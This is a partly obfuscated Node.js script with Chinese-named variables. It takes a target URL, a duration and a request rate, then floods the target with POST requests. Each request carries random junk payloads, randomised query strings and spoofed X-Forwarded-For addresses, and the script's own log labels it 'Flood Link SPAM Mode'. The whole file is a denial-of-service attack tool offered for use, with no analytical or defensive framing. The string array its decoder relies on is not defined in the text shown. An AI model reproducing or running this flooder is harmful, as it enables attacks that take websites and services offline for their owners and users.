(function(_0x小吴1, _0x小吴2) {
    const _0x小吴3 = function(_0x小吴4) {
        while (--_0x小吴4) {
            _0x小吴1['push'](_0x小吴1['shift']());
        }
    };
    _0x小吴3(++_0x小吴2);
}(_0x小吴数组, 0x1f4));

const _0x小吴解码 = function(_0x小吴5, _0x小吴6) {
    _0x小吴5 = _0x小吴5 - 0x0;
    return _0x小吴数组[_0x小吴5];
};

const 小吴请求 = require(_0x小吴解码('0x0'));
const 小吴随机 = require(_0x小吴解码('0x1'));
const 小吴字符串 = require(_0x小吴解码('0x2'));

const 小吴参数 = process[_0x小吴解码('0x3')]['slice'](0x2);
if (小吴参数['length'] < 0x3) {
    console[_0x小吴解码('0x4')](_0x小吴解码('0x5'));
    process[_0x小吴解码('0x6')](-0x1);
}

const 小吴网址 = 小吴参数[0x0];
const 小吴时间 = parseInt(小吴参数[0x1]);
const 小吴速率 = parseInt(小吴参数[0x2]);

function 小吴字节() {
    return Math['floor'](Math['random']() * 0xff);
}

function 小吴生成载荷(_0x小吴大小) {
    let _0x小吴结果 = '';
    const _0x小吴字符 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let 小吴i = 0x0; 小吴i < _0x小吴大小; 小吴i++) {
        _0x小吴结果 += _0x小吴字符['charAt'](Math['floor'](Math['random']() * _0x小吴字符['length']));
    }
    return _0x小吴结果;
}

console[_0x小吴解码('0x4')](`🔥 Flood Link SPAM Mode: ${小吴网址} | Duration: ${小吴时间}s | Rate: ${小吴速率} req/s`);

const 小吴间隔 = setInterval(() => {
    for (let 小吴j = 0x0; 小吴j < 小吴速率; 小吴j++) {
        const 小吴IP = `${小吴字节()}.${小吴字节()}.${小吴字节()}.${小吴字节()}`;
        const 小吴载荷 = 小吴生成载荷(0x400);

        const 小吴选项 = {
            url: 小吴网址 + '?' + 小吴字符串['generate'](0x8) + '=' + 小吴字符串['generate'](0x8),
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (compatible)',
                'Content-Type': 'application/json',
                'X-Forwarded-For': 小吴IP
            },
            body: JSON['stringify']({ spam: 小吴载荷 })
        };

        小吴请求(小吴选项, (_0x小吴错误, _0x小吴响应) => {
            if (_0x小吴错误) {
                console[_0x小吴解码('0x4')]("❌ Error: " + _0x小吴错误['message']);
            } else {
                console[_0x小吴解码('0x4')]("✅ SPAM sent | Status: " + _0x小吴响应['statusCode']);
            }
        });
    }
}, 0x3e8);

setTimeout(() => {
    clearInterval(小吴间隔);
    console[_0x小吴解码('0x4')]("✅ Flood Link selesai!");
}, 小吴时间 * 0x3e8);